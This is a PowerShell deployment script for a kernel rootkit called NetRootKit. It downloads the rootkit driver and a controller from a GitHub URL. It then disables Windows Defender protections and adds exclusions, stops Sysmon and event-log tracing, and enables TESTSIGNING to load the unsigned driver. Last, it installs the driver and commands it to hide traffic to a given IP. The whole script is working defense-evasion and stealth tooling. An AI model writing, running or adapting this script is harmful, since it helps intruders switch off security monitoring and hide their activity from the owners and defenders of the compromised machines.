<#
.SYNOPSIS
    Deploys the NetRootKit kernel driver, disables Windows Defender, and hides a specific IP.

.DESCRIPTION
    This script performs the following actions:
    1. Disables Windows Defender and ETW telemetry (requires admin/SYSTEM privileges).
    2. Enables TESTSIGNING mode (requires a reboot if not already enabled).
    3. Uses devcon.exe to install the NetRootKit.sys kernel driver.
    4. Uses NetRootKitController.exe to hide the remote IP: 10.2.0.144.
    
    WARNING: Must be run as Administrator.
#>

$ErrorActionPreference = "Stop"

# --- 0. Prepare Environment & Download Files ---
$BaseUrl = "https://github.com/KriyosArcane/NetRootKit/raw/refs/heads/master"
$TempDir = "C:\Windows\Temp\NRK"

Write-Host "[*] Creating temporary directory at $TempDir..."
if (-not (Test-Path $TempDir)) {
    New-Item -ItemType Directory -Force -Path $TempDir | Out-Null
}
Set-Location $TempDir

$FilesToDownload = @(
    "NetRootKit.inf",
    "NetRootKit.sys",
    "NetRootKitController.exe",
    "netrootkit.cat",
    "devcon.exe"
)

Write-Host "[*] Downloading NetRootKit components from GitHub..."
foreach ($File in $FilesToDownload) {
    if (-not (Test-Path $File)) {
        Write-Host "    -> Downloading $File..."
        Invoke-WebRequest -Uri "$BaseUrl/$File" -OutFile "$TempDir\$File" -UseBasicParsing
    }
}

# --- 1. Disable Windows Defender & Tamper Protection ---
Write-Host "[*] Disabling Windows Defender and Real-Time Protection..."
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
    Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
    
    # Attempt to add exclusions for the temporary directory
    Add-MpPreference -ExclusionPath $TempDir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionExtension ".sys", ".exe" -ErrorAction SilentlyContinue
    
    Write-Host "[+] Defender protections disabled."
} catch {
    Write-Host "[-] Failed to disable Defender (Tamper Protection may be on, or not running as Admin)."
}

# --- 2. Disable ETW Telementry (System-Wide) ---
Write-Host "[*] Patching ETW Providers..."
try {
    # Disable common ETW providers that EDRs use
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
    logman stop EventLog-Application -ets -ErrorAction SilentlyContinue
    logman stop EventLog-System -ets -ErrorAction SilentlyContinue
    Write-Host "[+] ETW Telemetry degraded."
} catch {
    Write-Host "[-] Failed to modify ETW."
}

# --- 3. Check / Enable TESTSIGNING ---
Write-Host "[*] Checking BCDEdit TESTSIGNING status..."
$bcd = bcdedit /enum '{current}'
if ($bcd -match "testsigning\s+Yes") {
    Write-Host "[+] TESTSIGNING is already ON."
} else {
    Write-Host "[!] TESTSIGNING is OFF. Enabling now..."
    bcdedit /set testsigning on
    Write-Host "[!] You MUST reboot the machine for TESTSIGNING to take effect. Run this script again after reboot."
    exit
}

# --- 4. Install NetRootKit Driver ---
Write-Host "[*] Installing NetRootKit Driver via devcon.exe..."
if (-not (Test-Path "devcon.exe")) {
    Write-Host "[-] devcon.exe not found in current directory! Exiting."
    exit
}

if (-not (Test-Path "NetRootKit.inf")) {
    Write-Host "[-] NetRootKit.inf not found in current directory! Exiting."
    exit
}

# Run devcon to install the driver
$devconOutput = .\devcon.exe install NetRootKit.inf Root\NetRootKit
Write-Host $devconOutput

# --- 5. Interact with Kernel Driver to Hide IP ---
Write-Host "[*] Sending hide-remote-ip command to NetRootKitController..."
if (-not (Test-Path "NetRootKitController.exe")) {
    Write-Host "[-] NetRootKitController.exe not found! Exiting."
    exit
}

# The IP the user requested to hide any traffic for
$TargetIP = "10.2.0.144"

Write-Host "[*] Checking connection to driver..."
.\NetRootKitController.exe check-connection "Ping"

Write-Host "[*] Hiding traffic for IP: $TargetIP"
$hideOut = .\NetRootKitController.exe hide-remote-ip $TargetIP
Write-Host $hideOut

Write-Host "[+] NetRootKit deployed successfully!"
